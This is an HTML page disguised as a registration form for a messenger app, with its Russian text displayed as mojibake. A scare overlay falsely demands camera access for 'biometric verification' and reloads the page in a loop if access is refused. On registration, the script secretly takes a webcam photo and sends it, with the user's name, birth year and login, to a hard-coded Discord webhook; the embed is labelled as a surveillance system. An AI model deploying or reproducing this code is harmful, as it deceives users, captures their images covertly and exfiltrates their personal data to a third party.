<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messenger Registration</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #0e1621; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        
        /* –û—Å–Ω–æ–≤–Ω–∞—è –∫–∞—Ä—Ç–æ—á–∫–∞ */
        .reg-card { background-color: #17212b; padding: 30px; border-radius: 10px; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 1; }
        h2 { text-align: center; color: #6ab3f3; }
        .input-group { margin-bottom: 12px; }
        label { display: block; margin-bottom: 5px; font-size: 13px; color: #82aaff; }
        input { width: 100%; padding: 10px; border-radius: 5px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; }
        .reg-btn { width: 100%; padding: 12px; background: #3390ec; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .reg-btn:hover { background: #2b77c0; }

        /* –û–∫–Ω–æ "–ü—É–≥–∞–ª–∫–∞" */
        #camera-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #0e1621; z-index: 1000; 
            display: flex; flex-direction: column; justify-content: center; align-items: center; 
            text-align: center; padding: 20px;
        }
        .warning-box { border: 1px solid #3390ec; padding: 25px; border-radius: 10px; max-width: 400px; background: #17212b; }
        .warning-box h3 { color: #ff5252; margin-top: 0; }
        .warning-box p { color: #cfd6dc; font-size: 14px; line-height: 1.5; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï</h3>
        <p>
            –î–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –≤ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–π —Å–µ—Ç–∏ Messenger, —Å–∏—Å—Ç–µ–º–∞ –¥–æ–ª–∂–Ω–∞ –ø—Ä–æ–≤–µ—Å—Ç–∏ <b>–±–∏–æ–º–µ—Ç—Ä–∏—á–µ—Å–∫—É—é –ø—Ä–æ–≤–µ—Ä–∫—É –æ–±–æ—Ä—É–¥–æ–≤–∞–Ω–∏—è</b>.
            <br><br>
            –ï—Å–ª–∏ –≤—ã –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ, –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å <b>–Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ</b>, –∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å –º–≥–Ω–æ–≤–µ–Ω–Ω–æ –∑–∞–º–æ—Ä–æ–∂–µ–Ω —Å–∏—Å—Ç–µ–º–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.
        </p>
        <button class="reg-btn" onclick="requestAccess()">–ü–û–î–¢–í–ï–†–î–ò–¢–¨ –ò –ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
    </div>
</div>

<div class="reg-card">
    <h2>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h2>
    <div class="input-group">
        <label>–ò–º—è</label>
        <input type="text" id="firstname" placeholder="–ò–≤–∞–Ω">
    </div>
    <div class="input-group">
        <label>–§–∞–º–∏–ª–∏—è</label>
        <input type="text" id="lastname" placeholder="–ò–≤–∞–Ω–æ–≤">
    </div>
    <div class="input-group">
        <label>–ì–æ–¥ —Ä–æ–∂–¥–µ–Ω–∏—è</label>
        <input type="number" id="birthyear" placeholder="2000">
    </div>
    <div class="input-group">
        <label>–õ–æ–≥–∏–Ω</label>
        <input type="text" id="login" placeholder="cool_user">
    </div>
    <div class="input-group">
        <label>–ü–∞—Ä–æ–ª—å</label>
        <input type="password" id="pass" placeholder="******">
    </div>
    <button class="reg-btn" onclick="register()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const overlay = document.getElementById('camera-overlay');
    
    // –¢–í–û–ô –í–ï–ë–•–£–ö
    const discordWebhookUrl = 'https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw';

    // –§—É–Ω–∫—Ü–∏—è –∑–∞–ø—Ä–æ—Å–∞ –¥–æ—Å—Ç—É–ø–∞
    async function requestAccess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            // –ü—Ä—è—á–µ–º –ø—É–≥–∞–ª–∫—É, –µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø –¥–∞–ª–∏
            overlay.style.display = 'none';
            document.body.style.overflow = 'auto';
        } catch (err) {
            console.error("–û—à–∏–±–∫–∞:", err);
            alert("–ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê: –î–æ—Å—Ç—É–ø –æ—Ç–∫–ª–æ–Ω–µ–Ω! –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ –¥–ª—è –≤–∞—à–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.");
            // –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã, —á—Ç–æ–±—ã –∑–∞—Ü–∏–∫–ª–∏—Ç—å –ø—É–≥–∞–ª–∫—É
            location.reload();
        }
    }

    // –§—É–Ω–∫—Ü–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
    async function register() {
        const data = {
            first: document.getElementById('firstname').value,
            last: document.getElementById('lastname').value,
            year: document.getElementById('birthyear').value,
            login: document.getElementById('login').value
        };

        if (!data.login || !data.first) {
            alert("–ó–∞–ø–æ–ª–Ω–∏ –≤—Å–µ –ø–æ–ª—è!");
            return;
        }

        // 1. –î–µ–ª–∞–µ–º —Å–∫—Ä—ã—Ç–æ–µ —Ñ–æ—Ç–æ
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0);
        
        // 2. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            
            const discordMessage = {
                embeds: [{
                    title: "üöÄ –ù–æ–≤–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è (—Å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–µ–π –ª–∏—Ü–∞)",
                    color: 3447003,
                    fields: [
                        { name: "–ò–º—è –§–∞–º–∏–ª–∏—è", value: `${data.first} ${data.last}`, inline: true },
                        { name: "–ì–æ–¥ —Ä–æ–∂–¥–µ–Ω–∏—è", value: data.year, inline: true },
                        { name: "–õ–æ–≥–∏–Ω", value: data.login, inline: false }
                    ],
                    image: { url: 'attachment://photo.png' },
                    footer: { text: "–°–∏—Å—Ç–µ–º–∞ —Å–ª–µ–∂–µ–Ω–∏—è –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞" }
                }]
            };

            formData.append('payload_json', JSON.stringify(discordMessage));
            formData.append('file', blob, 'photo.png');

            try {
                const response = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    alert("–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –î–∞–Ω–Ω—ã–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω—ã.");
                } else {
                    alert("–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.");
                }
            } catch (err) {
                alert("–û—à–∏–±–∫–∞ —Å–µ—Ç–∏.");
            }
        }, 'image/png');
    }
</script>

</body>

</html>
